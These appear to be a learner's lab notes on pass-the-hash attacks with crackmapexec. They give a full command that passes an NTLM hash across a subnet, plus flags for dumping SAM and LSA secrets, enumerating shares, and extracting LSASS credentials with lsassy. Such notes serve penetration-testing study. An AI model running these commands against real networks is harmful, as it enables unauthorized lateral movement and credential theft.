Pass Attacks

Monday, October 9, 2023

8:08 PM

 

Run crackmapexec against smb on the entire subnet

 

\*HAD TO BE REINSTALLED 6.1 WITH PIPX\*

 

![](001_Pass_Attacks_000.png){width="6.645833333333333in" height="1.28125in"}

 

![](001_Pass_Attacks_001.png){width="9.916666666666666in" height="5.364583333333333in"}

Machines with Pwn3d! Have valid creds -but still check others out Pwn3d means admin access but green check also means valid creds.

 

-   Pass the hash example code

    -   crackmapexec smb 10.0.2.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b \--local-auth

> ![](001_Pass_Attacks_002.png){width="10.5625in" height="3.4479166666666665in"}
>
> Must be v1 for pass the hash
>
>  
>
> Add \--sam to end to pass the hash around
>
> ![](001_Pass_Attacks_003.png){width="11.0in" height="6.864583333333333in"}
>
> Dumps sam with a successful login
>
>  
>
> \--shares to enumerate shares
>
> ![](001_Pass_Attacks_004.png){width="14.65625in" height="4.3125in"}
>
>  
>
> \--lsa to dump LSA
>
> ![](001_Pass_Attacks_005.png){width="17.40625in" height="6.6875in"}
>
> (What does LSA do in Windows?
>
> The LSA, which includes the Local Security Authority Server Service (LSASS) process, validates users for local and remote sign-ins and enforces local security policies. Starting with Windows 8.1 and later, added protection for the LSA is provided to prevent reading memory and code injection by nonprotected processes.
>
>  

*From \<<https://www.google.com/search?q=windows+lsa&oq=windows+lsa&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIICAEQABgWGB4yCAgCEAAYFhgeMggIAxAAGBYYHjIICAQQABgWGB4yCAgFEAAYFhgeMggIBhAAGBYYHjIICAcQABgWGB4yCAgIEAAYFhge0gEIMjQ3OWowajGoAgCwAgA&sourceid=chrome&ie=UTF-8>\> )*

>  
>
>  
>
> List Modules crackmapexec smb -L
>
> ![](001_Pass_Attacks_006.png){width="16.65625in" height="7.03125in"}
>
>  
>
>  
>
> Lsassy to see secrets stored in memory -credentials from lsass
>
> ![](001_Pass_Attacks_007.png){width="13.40625in" height="2.2604166666666665in"}
>
>  

-   cmedb -database of everything captured while using crackmap

> Can be output to file

 

> ![](001_Pass_Attacks_008.png){width="15.041666666666666in" height="4.8125in"}
>
>  
